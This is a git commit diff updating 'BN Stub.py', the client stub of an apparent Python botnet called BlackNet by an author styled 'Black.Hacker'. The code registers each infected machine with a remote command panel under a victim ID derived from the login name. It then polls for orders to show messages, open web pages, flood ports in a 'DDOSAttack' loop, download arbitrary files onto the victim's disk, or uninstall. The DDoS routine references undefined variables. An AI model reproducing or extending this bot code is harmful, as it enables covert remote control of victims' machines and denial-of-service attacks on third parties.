7dae606ae6248b7f0b8dbe7b262d4f37b8137d6c
Black.Hacker <farisksa79@gmail.com>
2019-01-12 20:39:02 +0300

    Update BN Stub.py

--- BN Stub.py
+++ BN Stub.py
@@ -6,40 +6,74 @@ import platform
 import base64
 import time
 
-URL = "http://botnethost/blacknet/"
-uid = "Hacked_" + base64.b64encode(os.getlogin());
+PanelURL = "http://darksoftware.ml/blacknet/"
+cid = "HacKed"
+uid = cid + "_" + base64.b64encode(os.getlogin());
 if os.name == "posix":
       oss = "GNU/LINUX"
-pass
-requests.get(url = URL + "connection.php", params = {
-		    'VicID': uid,
-            'os': oss,
-            'antivirus': "None",
-            'status': "Online"
-})
+elif os.name == 'nt':
+	 oss = "Microsoft Windows"
+else:
+	 oss = "MacOS"
+
+requests.get(url = PanelURL + "connection.php", params = {'VicID': uid,'os': oss,'antivirus': "None",'status': "Online"})
 
 count = 0
 while (count == 0):
-   commands = requests.get(URL + "/Clients/" + uid + ".txt")
+   commands = requests.get(PanelURL + "/Clients/" + uid + ".txt")
    splitcommand = commands.text.split("|BN|")
-   time.sleep(20)
-   if splitcommand == "":
-      print "hello"
+   time.sleep(10)
+   if splitcommand[0] == '':
+      print ""
    else:
-   	   if splitcommand[0] == "PrintMessage":
-   	      print splitcommand[1]
-   	      requests.get(url = URL + "receive.php", params = {
-   	      	'command': "CleanCommands",
-		    'VicID': uid
-           })
-   	   pass
-   	   if splitcommand[0] == "OpenWebpage":
-   	      os.system("firefox " + splitcommand[1])
-   	      requests.get(url = URL + "receive.php", params = {
-   	      	'command': "CleanCommands",
-		    'VicID': uid
-           })
-   	   pass
+      if splitcommand[0] == "PrintMessage":
+         
+              time.sleep(10)
+              print splitcommand[1]
+              time.sleep(10)
+              requests.get(url = PanelURL + "receive.php", params = {'command': "CleanCommands",'VicID': uid})
+      else:
+         print "";
+
+      if splitcommand[0] == "OpenPage":
+                time.sleep(10)
+                os.system("firefox " + splitcommand[1])
+                time.sleep(10)
+                requests.get(url = PanelURL + "receive.php", params = {'command': "CleanCommands",'VicID': uid})
+      else:
+         print "";
+
+      if splitcommand[0] == "DDOSAttack":
+                port = 80;
+                while True:
+                     sock.sendto(bytes, (ip,port))
+                     sent = sent + 1
+                     port = port + 1
+                     if port == 65534:
+                        port = 1
+      else:
+         print "";
+         
+      if splitcommand[0] == "UploadFile":
+              file_url = splitcommand[1]
+              r = requests.get(file_url, stream = True) 
+              with open(splitcommand[2],"wb") as pdf: 
+                  for chunk in r.iter_content(chunk_size=1024): 
+                   if chunk: 
+                    pdf.write(chunk) 
+                   pass
+                  requests.get(url = PanelURL + "receive.php", params = {'command': "CleanCommands",'VicID': uid})
+      else:
+         print "";
+
+      if splitcommand[0] == "Uninstall":
+                  requests.get(url = PanelURL + "receive.php", params = {'command': "Uninstall",'VicID': uid})
+                  quit()
+      else:
+         print "";
+
+      if splitcommand[0] == "Close":
+                  quit()
+      else:
+         print "";
 pass
-
-
